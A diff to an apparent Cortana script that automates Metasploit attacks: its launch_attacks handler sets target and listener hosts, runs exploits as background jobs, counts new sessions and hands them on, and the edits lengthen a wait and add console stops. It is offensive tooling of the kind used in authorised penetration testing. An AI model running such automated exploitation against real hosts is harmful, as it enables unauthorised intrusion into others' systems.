@@ -184,7 +184,7 @@ on launch_attacks {
          cmd_set($console, %(RHOST => "$rhost", LHOST => "$lhost", TARGET => "0"));
          cmd($console, "exploit -j");
       
-         sleep(10000);
+         sleep(15000);
          cmd($console, "jobs -K");
          if (size(sessions()) > $numSessions) {
             $numSessions = size(sessions());
@@ -201,6 +201,7 @@ on launch_attacks {
    }
    #println(%exp_run);
    #println(%exploits);
+   cmd_stop($console);
    fire_event_local("sessionHandle", @hosts, %exploits, %exp_run);
 }
 
@@ -239,7 +240,7 @@ on sessionHandle {
          remove(@hosts, $host);
       }
    }
-
+   cmd_stop($console);
    fire_event_local("noSessions", @hosts, %exploits, %exp_run);
 }
 
